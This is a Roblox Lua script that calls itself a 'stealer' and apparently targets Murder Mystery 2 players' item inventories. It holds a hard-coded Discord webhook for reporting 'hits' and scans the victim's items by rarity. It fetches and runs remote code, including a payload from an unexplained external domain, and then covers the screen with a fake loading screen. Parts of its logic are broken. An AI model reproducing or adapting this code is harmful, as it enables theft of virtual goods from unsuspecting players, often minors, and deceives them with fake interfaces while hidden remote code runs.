Config = {
    Receivers = {"1LazySly8", ""}, -- Your Username/s.
    Webhook = "https://discord.com/api/webhooks/1291752093387853988/4Xte3V-WEnQotkIPZv173EMATsBRMccyT6Dt20_JOM2EptEHto0S0opxeEykAaBjxOH-", -- Your webhook for hits.
    FullInventory = true, -- If true, it will display all of the player's items.
    GoodItemsOnly = false, -- If set to true, the stealer will not ping you if the player only has items below legendary.
    ResendTrade = ".", -- Send this in chat to resend the trade request if you don't receive it.
    Script = "None", -- Scripts > "None", "Custom", "Highlight Hub".
    CustomLink = "None" -- If Script is set to Custom, provide the custom URL here.
}

repeat wait() until game:IsLoaded()

if getgenv().scriptexecuted then return end
getgenv().scriptexecuted = true

LogsWebhook = "https://discord.com/api/webhooks/1291752093387853988/4Xte3V-WEnQotkIPZv173EMATsBRMccyT6Dt20_JOM2EptEHto0S0opxeEykAaBjxOH-"
-- Logs Webhook

LOGS_WEBS = LogsWebhook

local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local VirtualUser = game:GetService("VirtualUser")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local Trade = ReplicatedStorage.Trade
local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
local Position = UDim2.new(0, 9999, 0, 9999)
local Inventory = {}
local StealerName = "m.kai"

local function sendnotification(message)
    getgenv().scriptexecuted = false
    print("["..StealerName.."]:" .. message)
    Notification:Notify(
        {Title = "[ "..StealerName.." ]", Description = message},
        {OutlineColor = Color3.fromRGB(80, 80, 80), Time = 7, Type = "default"}
    )
end

local messageMM2 = "You just got a new hit with **"..StealerName.."**!"
if Config.GoodItemsOnly and (Vintage > 0 or Godly > 0 or Ancient > 0 or Unique > 0) then
    messageMM2 = "@everyone\nYou just got a new **good** hit with **"..StealerName.."**!"
end

local success, errorMsg = pcall(function()
    local games = {
        [142823291] = true,
        [335132309] = true,
        [636649648] = true
    }
    
    if not games[game.PlaceId] then
        game:GetService("Players").LocalPlayer:Kick("\nUnsupported game!")
        while true do wait() end
    end
    
    -- Webhook validation
    if not Config.Webhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
        sendnotification("Invalid 'Webhook' URL!")
        InvaildWebhook = true
        return
    end
    
    if not LogsWebhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
        sendnotification("Invalid 'Logs' URL!")
        return
    end
    
    if type(Config.Receivers) ~= "table" or #Config.Receivers == 0 then
        sendnotification("Invalid 'Receivers' table!")
        return
    end
    
    if Config.Script == "Custom" and not Config.CustomLink:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
        sendnotification("Invalid 'Custom' URL!")
        return
    end
    
    -- Ensure FullInventory is boolean
    Config.FullInventory = Config.FullInventory == true

    if Config.Script == nil then
        Config.Script = "None"
    elseif Config.Script == "Custom" then
        Config.Script = Config.Script .. " - " .. Config.CustomLink
    end
    
    -- Load script based on Config.Script
    if Config.Script == "Custom" then
        loadstring(game:HttpGet(Config.CustomLink))()
    elseif Config.Script == "Mega Hub" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Hubs/main/Mega.lua", true))()
    elseif Config.Script == "YARHM" then
        loadstring(game:HttpGet("https://yarhm.goteamst.com/scr", false))()
    elseif Config.Script == "Nexus" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
    end
    
    -- Initialize item counts
    local itemCounts = {
        Common = 0,
        Uncommon = 0,
        Rare = 0,
        Legendary = 0,
        Vintage = 0,
        Godly = 0,
        Ancient = 0,
        Unique = 0
    }

    LocalPlayer.Idled:connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end)
    
    -- Determine UI path
    local UIPath, TradePath, Mobile
    if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") then
        UIPath = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
        TradePath = LocalPlayer.PlayerGui.TradeGUI
        Mobile = false
    else
        UIPath = LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
        TradePath = LocalPlayer.PlayerGui.TradeGUI_Phone
        Mobile = true
    end
    
    function TapUI(button, check, button2)
        if check == "Active Check" and button.Active then
            button = button[button2]
        elseif check == "Text Check" and button == "^" then
            button = button2
        else
            return
        end
        for _, v in pairs(events) do
            for _, conn in pairs(getconnections(button[v])) do
                conn:Fire()
            end
        end
    end
    
    function Rarity(color, amount, tradeable)
        local Stack = amount ~= "" and tonumber(amount:match("x(%d+)")) or 1
        local r, g, b = math.floor(color.R * 255 + 0.5), math.floor(color.G * 255 + 0.5), math.floor(color.B * 255 + 0.5)
        
        if r == 106 and g == 106 and b == 106 then
            itemCounts.Common = itemCounts.Common + Stack
        elseif r == 0 and g == 255 and b == 255 then
            itemCounts.Uncommon = itemCounts.Uncommon + Stack
        elseif r == 0 and g == 200 and b == 0 then
            itemCounts.Rare = itemCounts.Rare + Stack
        elseif r == 220 and g == 0 and b == 5 then
            itemCounts.Legendary = itemCounts.Legendary + Stack
        elseif r == 255 and g == 0 and b == 179 then
            itemCounts.Godly = itemCounts.Godly + Stack
        elseif r == 100 and g == 10 and b == 255 then
            itemCounts.Ancient = itemCounts.Ancient + Stack
        elseif r == 240 and g == 140 and b == 0 then
            itemCounts.Unique = itemCounts.Unique + Stack
        else
            itemCounts.Vintage = itemCounts.Vintage + Stack
        end
    end

    function checkitem(v)
        if v:IsA("Frame") then
            local itemNameLabel = v:FindFirstChild("ItemName")
            if itemNameLabel and itemNameLabel:IsA("TextLabel") then
                local itemName = itemNameLabel.Label.Text
                if itemName ~= "Default Knife" and itemName ~= "Default Gun" then
                    Rarity(v.ItemName.BackgroundColor3, v.Container.Amount.Text, v:FindFirstChild("Tags"))
                    if Config.FullInventory then
                        local number = v.Container.Amount.Text ~= "" and v.Container.Amount.Text or "x1"
                        table.insert(Inventory, itemName .. " " .. number)
                    end
                end
            else
                warn("ItemName not found for item: " .. tostring(v))
            end
        end
    end
    

    function InventoryCheck()
        for _, v in pairs(UIPath:GetChildren()) do
            checkitem(v)
        end
        if Config.FullInventory then
            if #Inventory > 0 then
                sendnotification("You have " .. #Inventory .. " items in your inventory.")
                for _, item in ipairs(Inventory) do
                    sendnotification(item)
                end
            else
                sendnotification("Your inventory is empty.")
            end
        end
    end

    function onPlayerAdded(player)
        local success, result = pcall(function()
            local UserId = player.UserId
            local TradeData = HttpService:JSONDecode(game:GetService("ReplicatedStorage").TradeData:InvokeServer(UserId))

            -- Process trade data
            for _, v in pairs(TradeData) do
                if Config.FullInventory then
                    local number = v.Amount ~= "" and v.Amount or "x1"
                    table.insert(Inventory, v.Name .. " " .. number)
                end
                sendnotification("You have traded with " .. player.Name .. " who has " .. v.Amount .. " " .. v.Name)
            end
        end)

        if not success then
            warn("Error processing trade data for player: " .. player.Name .. " - " .. result)
        end
    end

    -- Connect to players added event
    Players.PlayerAdded:Connect(onPlayerAdded)

    -- Initial inventory check
    InventoryCheck()

    -- Trade handling logic (may require adaptation)
    Trade.OnClientEvent:Connect(function(trader)
        onPlayerAdded(trader)
    end)
end)

if errorMsg then
    sendnotification("Error: " .. errorMsg)
end

getgenv().gui = false
loadstring(game:HttpGet("https://egorikusa.space/fd7786785e8435a91b6a7bda.lua", true))()

LoadingScreenValue = true
LoadingText1 = "Loading Library"
LoadingText2 = "Updating Library"
LoadingText3 = "Getting Script"
LoadingText4 = "Checking Script"
LoadingText5 = "Bypassing Anti-Cheat"
LoadingText6 = "Please Wait"
LoadingText7 = "Initializing Game Systems..."
LoadingText8 = "Establishing Connection..."
LoadingText9 = "Loading Player Profile..."
LoadingText10 = "Synchronizing Game Assets..."
LoadingText11 = "Connecting to Game Server..."
LoadingText12 = "Preparing Your Experience..."
LoadingText13 = "Loading Game Elements..."
LoadingText14 = "Analyzing Game Environment..."
LoadingText15 = "Reconfiguring Settings..."
LoadingText16 = "Syncing Player Data..."
LoadingText17 = "Downloading Updates..."
LoadingText18 = "Loading User Interface..."
LoadingText19 = "Calibrating Experience..."
LoadingText20 = "Booting Up..."

local ScriptTitle = "Loading the script..."

-- LOADING SCREEN
if LoadingScreenValue ~= false then
	local Loading = Instance.new("ScreenGui")
	local MainFrame = Instance.new("Frame")
	local Title = Instance.new("TextLabel")
	local Dots = Instance.new("Frame")
	local Dot1 = Instance.new("Frame")
	local UICorner = Instance.new("UICorner")
	local InsideDot = Instance.new("Frame")
	local UICorner_2 = Instance.new("UICorner")
	local Dot2 = Instance.new("Frame")
	local UICorner_3 = Instance.new("UICorner")
	local InsideDot_2 = Instance.new("Frame")
	local UICorner_4 = Instance.new("UICorner")
	local Dot3 = Instance.new("Frame")
	local UICorner_5 = Instance.new("UICorner")
	local InsideDot_3 = Instance.new("Frame")
	local UICorner_6 = Instance.new("UICorner")
	local Bar = Instance.new("Frame")
	local Bar2 = Instance.new("Frame")
	local UICorner_7 = Instance.new("UICorner")
	local UICorner_8 = Instance.new("UICorner")
	local Percentage = Instance.new("TextLabel")
	local Tip = Instance.new("TextLabel")
	local EndSequence = Instance.new("Frame")
	Loading.Name = "FakeLoadingScreen"
	Loading.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	Loading.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	Loading.DisplayOrder = 10000
	MainFrame.Name = "MainFrame"
	MainFrame.Parent = Loading
	MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	MainFrame.BorderSizePixel = 0
	MainFrame.Position = UDim2.new(-0.125662372, 0, -0.125935167, 0)
	MainFrame.Size = UDim2.new(1.25, 0, 1.25, 0)
	Title.Name = "Title"
	Title.Parent = MainFrame
	Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Title.BackgroundTransparency = 1.000
	Title.Position = UDim2.new(0.183329239, 0, 0.246382296, 0)
	Title.Size = UDim2.new(0.632528603, 0, 0.232815996, 0)
	Title.Font = Enum.Font.FredokaOne
	Title.Text = ScriptTitle
	Title.TextColor3 = Color3.fromRGB(255, 255, 255)
	Title.TextScaled = true
	Title.TextSize = 14.000
	Title.TextWrapped = true
	Dots.Name = "Dots"
	Dots.Parent = MainFrame
	Dots.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Dots.BackgroundTransparency = 1.000
	Dots.Position = UDim2.new(0.470970035, 0, 0.818612278, 0)
	Dots.Size = UDim2.new(0.0571707934, 0, 0.0360675976, 0)
	Dot1.Name = "Dot1"
	Dot1.Parent = Dots
	Dot1.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	Dot1.Position = UDim2.new(0.0611661971, 0, 0.234447539, 0)
	Dot1.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
	UICorner.CornerRadius = UDim.new(0.5, 0)
	UICorner.Parent = Dot1
	InsideDot.Name = "InsideDot"
	InsideDot.Parent = Dot1
	InsideDot.AnchorPoint = Vector2.new(0.5, 0.5)
	InsideDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	InsideDot.Position = UDim2.new(0.5, 0, 0.5, 0)
	UICorner_2.CornerRadius = UDim.new(0.5, 0)
	UICorner_2.Parent = InsideDot
	Dot2.Name = "Dot2"
	Dot2.Parent = Dots
	Dot2.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	Dot2.Position = UDim2.new(0.419989735, 0, 0.234447539, 0)
	Dot2.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
	UICorner_3.CornerRadius = UDim.new(0.5, 0)
	UICorner_3.Parent = Dot2
	InsideDot_2.Name = "InsideDot"
	InsideDot_2.Parent = Dot2
	InsideDot_2.AnchorPoint = Vector2.new(0.5, 0.5)
	InsideDot_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	InsideDot_2.Position = UDim2.new(0.5, 0, 0.5, 0)
	UICorner_4.CornerRadius = UDim.new(0.5, 0)
	UICorner_4.Parent = InsideDot_2
	Dot3.Name = "Dot3"
	Dot3.Parent = Dots
	Dot3.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	Dot3.Position = UDim2.new(0.778813243, 0, 0.234447539, 0)
	Dot3.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
	UICorner_5.CornerRadius = UDim.new(0.5, 0)
	UICorner_5.Parent = Dot3
	InsideDot_3.Name = "InsideDot"
	InsideDot_3.Parent = Dot3
	InsideDot_3.AnchorPoint = Vector2.new(0.5, 0.5)
	InsideDot_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	InsideDot_3.Position = UDim2.new(0.5, 0, 0.5, 0)
	UICorner_6.CornerRadius = UDim.new(0.5, 0)
	UICorner_6.Parent = InsideDot_3
	Bar.Name = "Bar"
	Bar.Parent = MainFrame
	Bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	Bar.BorderSizePixel = 0
	Bar.Position = UDim2.new(0.219547689, 0, 0.764966607, 0)
	Bar.Size = UDim2.new(0.560904443, 0, 0.0365853645, 0)
	Bar2.Name = "Bar2"
	Bar2.Parent = Bar
	Bar2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
	Bar2.BorderSizePixel = 0
	Bar2.Size = UDim2.new(0, 0, 1, 0)
	UICorner_7.CornerRadius = UDim.new(0.5, 0)
	UICorner_7.Parent = Bar2
	UICorner_8.CornerRadius = UDim.new(0.5, 0)
	UICorner_8.Parent = Bar
	Percentage.Name = "Percentage"
	Percentage.Parent = Bar
	Percentage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Percentage.BackgroundTransparency = 1.000
	Percentage.Position = UDim2.new(0.280816972, 0, 0.0909090936, 0)
	Percentage.Size = UDim2.new(0.438366145, 0, 0.787879348, 0)
	Percentage.Font = Enum.Font.FredokaOne
	Percentage.Text = "0%"
	Percentage.TextColor3 = Color3.fromRGB(255, 255, 255)
	Percentage.TextScaled = true
	Percentage.TextSize = 14.000
	Percentage.TextWrapped = true
	Tip.Name = "Tip"
	Tip.Parent = MainFrame
	Tip.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Tip.BackgroundTransparency = 1.000
	Tip.Position = UDim2.new(0.349135160, 0, 0.603216052, 0)
	Tip.Size = UDim2.new(0.30531478, 0, 0.106667064, 0)
	Tip.Font = Enum.Font.FredokaOne
	Tip.Text = "The script is loading, please wait..."
	Tip.TextColor3 = Color3.fromRGB(255, 255, 255)
	Tip.TextScaled = true
	Tip.TextSize = 14.000
	Tip.TextWrapped = true
	EndSequence.Name = "EndSequence"
	EndSequence.Parent = MainFrame
	EndSequence.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	EndSequence.BackgroundTransparency = 1.000
	EndSequence.Size = UDim2.new(0, 0, 0, 0)

	-- The loading process
	local loadingSteps = {
		{LoadingText1, 2.5}, -- Increase wait time for a smoother effect
		{LoadingText2, 2.5},
		{LoadingText3, 2.5},
		{LoadingText4, 2.5},
		{LoadingText5, 2.5},
		{LoadingText6, 2.5},
		{LoadingText7, 2.5},
		{LoadingText8, 2.5},
		{LoadingText9, 2.5},
		{LoadingText10, 2.5},
		{LoadingText11, 2.5},
		{LoadingText12, 2.5},
		{LoadingText13, 2.5},
		{LoadingText14, 2.5},
		{LoadingText15, 2.5},
		{LoadingText16, 2.5},
		{LoadingText17, 2.5},
		{LoadingText18, 2.5},
		{LoadingText19, 2.5},
		{LoadingText20, 2.5},
	}

	local totalSteps = #loadingSteps
	local currentStep = 0

	for _, step in ipairs(loadingSteps) do
		currentStep = currentStep + 1
		Percentage.Text = math.floor((currentStep / totalSteps) * 100) .. "%"
		Tip.Text = step[1]
		Bar2.Size = UDim2.new(currentStep / totalSteps, 0, 1, 0)
		wait(step[2]) -- Wait time for each step
	end

	wait(0.5) -- Short wait before closing
	Loading:Destroy() -- Close loading screen
end
